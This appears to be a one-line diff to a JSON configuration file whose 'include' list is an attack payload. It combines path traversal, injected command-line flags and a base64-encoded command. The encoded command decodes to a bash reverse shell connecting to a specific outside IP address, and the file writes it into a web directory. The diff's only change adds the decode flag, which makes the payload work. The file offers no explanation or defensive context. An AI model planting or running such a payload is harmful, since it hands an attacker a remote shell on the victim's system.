@@ -1,1 +1,1 @@
-{"include":["../../../../../../tmp","-T","-TT","echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xNTMuMTI2LjE5MC4xODMvODg5IDA+JjEgJg==|base64>../../../../../../var/www/outfile/flagt/master/x1.txt"]}
+{"include":["../../../../../../tmp","-T","-TT","echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xNTMuMTI2LjE5MC4xODMvODg5IDA+JjEgJg==|base64 -d >../../../../../../var/www/outfile/flagt/master/x1.txt"]}
